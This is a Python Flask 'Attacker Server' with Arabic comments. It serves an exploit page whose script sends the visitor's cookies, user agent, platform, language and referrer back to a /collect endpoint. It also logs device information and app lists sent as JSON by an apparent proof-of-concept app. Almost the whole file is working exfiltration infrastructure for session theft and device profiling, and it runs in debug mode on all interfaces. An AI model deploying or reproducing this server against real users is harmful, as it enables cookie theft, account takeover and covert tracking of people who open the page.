from flask import Flask, request, jsonify, make_response
import datetime
import os

app = Flask(__name__)
LOG_FILE = 'log.txt'

# صفحة الاستغلال المعدلة (ترسل FormData)
EXPLOIT_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
    <script>
    (function() {
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        if (!token) {
            document.body.innerHTML = "<p>Error: No token provided.</p>";
            return;
        }

        // إرسال البيانات باستخدام FormData (يعمل مع no-cors)
        const formData = new FormData();
        formData.append('userAgent', navigator.userAgent);
        formData.append('language', navigator.language);
        formData.append('platform', navigator.platform);
        formData.append('cookies', document.cookie);
        formData.append('referrer', document.referrer);

        fetch('/collect', {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        });

        document.body.innerHTML = "<p>Data exfiltrated.</p>";
    })();
    </script>
</head>
<body>
    <p>Loading...</p>
</body>
</html>"""

@app.route('/')
def index():
    return "Attacker Server is running. Use /exploit.html for the exploit page."

@app.route('/exploit.html')
def exploit_page():
    """يقدم صفحة الاستغلال مع تسجيل المعاملات"""
    print(f"[REQUEST] /exploit.html from {request.remote_addr} with args: {request.args}")
    response = make_response(EXPLOIT_HTML)
    response.headers['Content-Type'] = 'text/html'
    return response

@app.route('/collect', methods=['POST'])
def collect():
    ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # تحقق من نوع المحتوى
    if request.is_json:
        # إذا كان JSON (من POC)
        data = request.get_json()
        log_entry = f"{timestamp} | IP: {ip} | Device Info (JSON): {data}\n"
        print(f"[DEVICE INFO] {log_entry.strip()}")
    else:
        # إذا كان FormData (من صفحة الويب)
        data = {
            'userAgent': request.form.get('userAgent'),
            'language': request.form.get('language'),
            'platform': request.form.get('platform'),
            'cookies': request.form.get('cookies'),
            'referrer': request.form.get('referrer')
        }
        log_entry = f"{timestamp} | IP: {ip} | Web Data: {data}\n"
        print(f"[COLLECT] {log_entry.strip()}")
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    return jsonify({"status": "ok"}), 200

@app.route('/device_info', methods=['POST'])
def device_info():
    """يستقبل معلومات الجهاز وقائمة التطبيقات من تطبيق POC (JSON)"""
    ip = request.remote_addr
    data = request.get_json()  # تطبيق POC يرسل JSON
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    log_entry = f"{timestamp} | IP: {ip} | Device Info: {data}\n"
    print(f"[DEVICE INFO] {log_entry.strip()}")
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    return jsonify({"status": "ok"}), 200

# مسار للتأكد من أن السيرفر يعالج أي طلب آخر (اختياري)
@app.route('/<path:path>')
def catch_all(path):
    print(f"[404] Path: {path}, Args: {request.args}, IP: {request.remote_addr}")
    return "Not Found", 404

if __name__ == '__main__':
    print("Starting server on http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, debug=True)